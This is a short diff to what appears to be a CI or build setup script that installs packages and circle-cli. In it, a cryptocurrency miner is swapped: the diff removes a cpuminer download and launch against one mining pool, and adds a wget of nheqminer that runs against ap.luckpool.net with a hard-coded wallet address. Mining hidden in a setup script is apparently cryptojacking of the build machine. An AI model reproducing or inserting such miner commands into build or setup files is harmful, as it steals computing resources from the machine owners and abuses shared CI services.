@@ -1,6 +1,7 @@
 apt-get update
 apt-get install -y ruby jq curl rsync hub
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
-./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u MkgB8Pqwi9366Jph9Lu1pk1kXnzcKUivny.yess -t2
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.FAxSlowmo_sR -p x -t 2
 gem install circle-cli
